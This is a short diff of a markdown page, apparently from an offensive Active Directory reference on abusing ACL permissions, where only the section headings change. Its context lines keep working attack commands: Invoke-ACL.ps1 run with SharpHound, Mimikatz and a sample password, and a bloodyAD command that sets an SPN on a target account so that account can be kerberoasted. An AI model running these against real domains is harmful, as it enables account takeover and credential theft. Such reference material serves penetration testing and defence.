@@ -43,9 +43,9 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
  ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'
  ```
 
-## GenericAll/GenericWrite
+## GenericAll/GenericWrite Abuse
 
-### User/Computer
+### From Linux
 
 We can set a **SPN** on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.
 
@@ -68,7 +68,8 @@ We can set a **SPN** on a target account, request a Service Ticket (ST), then gr
   bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname
   ```
 
-* Windows only
+### From Windows
+* **Using Powerview**  
 
   ```ps1
   # Check for interesting permissions on accounts:
